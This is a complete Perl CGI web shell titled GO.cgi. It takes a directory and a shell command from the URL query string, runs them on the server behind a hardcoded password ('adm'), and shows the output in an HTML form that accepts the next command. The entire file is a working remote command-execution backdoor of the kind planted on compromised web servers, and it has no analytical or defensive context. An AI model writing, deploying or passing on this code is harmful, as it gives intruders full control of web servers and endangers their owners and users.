#!/usr/bin/perl

#change this password; for power security - delete this file =)
$pwd='adm';

print "Content-type: text/html\n\n";
&read_param();
if (!defined$param{dir}){$param{dir}="/"};
if (!defined$param{cmd}){$param{cmd}="ls -la"};
if (!defined$param{pwd}){$param{pwd}='ter'};

print << "[kalabanga]";
<head>
<title>GO.cgi</title>
<style>
BODY, TD { font-family: Tahoma; font-size: 12px; }
INPUT.TEXT  {
font-family : Arial;
font-size : 8pt;
color : Black;
width : 100%;
background-color : #F1F1F1;
border-style : solid;
border-width : 0px;
border-color : Silver;
}
INPUT.BUTTON  {
font-family : Arial;
font-size : 8pt;
width : 100px;
border-width : 1px;
color : Black;
background-color : D1D1D1;
border-color : silver;
border-style : solid;
}
</style>
</head>
<body bgcolor=#B9B9B9>
Current request is:
<table width=100% bgcolor=D9D9D9><tr><td>
[kalabanga]

print "cd $param{dir}&&$param{cmd}";

print << "[kalabanga]";
</td></tr></table>
Answer for current request is:
<table width=100% bgcolor=D9D9D9><tr><td><pre>
[kalabanga]

if ($param{pwd} ne $pwd){print "user invalid, please replace user";}
else {
open(FILEHANDLE, "cd $param{dir}&&$param{cmd}|");
while ($line=<FILEHANDLE>){print "$line";};
close (FILEHANDLE);
};

print << "[kalabanga]";
</pre></td></tr></table>
<form action=go.cgi>
Password:
<input type=text class="TEXT" name=pwd value=$param{pwd}>
Dir for next request:
<input type=text class="TEXT" name=dir value=$param{dir}>
next request:
<input type=text class="TEXT" name=cmd value=$param{cmd}>
<input type=submit class="button" value="Submit">
<input type=reset class="button" value="Reset">
</form>
</body>
</html>
[kalabanga]

sub read_param {
$buffer = "$ENV{'QUERY_STRING'}";
@pairs = split(/&/, $buffer);
foreach $pair (@pairs)
        {
        ($name, $value) = split(/=/, $pair);
        $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
        $value =~ s/\+/ /g;
        $value =~ s/%20/ /g;
        $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
        $param{$name} = $value;
        }
}